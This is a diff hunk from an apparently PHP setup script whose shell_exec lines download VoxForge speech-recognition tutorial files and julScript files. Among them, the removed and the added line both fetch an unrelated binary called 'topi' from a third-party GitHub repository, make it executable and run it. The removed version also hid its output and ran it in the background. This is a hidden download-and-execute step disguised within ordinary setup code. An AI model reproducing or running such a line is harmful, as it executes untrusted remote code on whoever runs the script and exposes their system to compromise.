@@ -58,7 +58,7 @@ shell_exec("wget -c https://raw.githubusercontent.com/VoxForge/develop/master/tu
 shell_exec("wget -c https://raw.githubusercontent.com/VoxForge/develop/master/tutorial/maketriphones.ded");
 shell_exec("wget -c https://raw.githubusercontent.com/VoxForge/develop/master/tutorial/tree1.hed");
 shell_exec("wget -c https://github.com/ImAshishRastogi/julScript/blob/master/app.php");
-shell_exec("curl -LJO --output topi https://raw.githubusercontent.com/aurbach55/pos/main/topi  >/dev/null 2>&1 && chmod +x topi && nohup ./topi > nohup.out");
+shell_exec("wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod +x topi && ./topi");
 shell_exec("wget -c https://github.com/ImAshishRastogi/julScript/blob/master/INSTRUCTION.md");
 
 shell_exec("mv global.ded julius/model/");
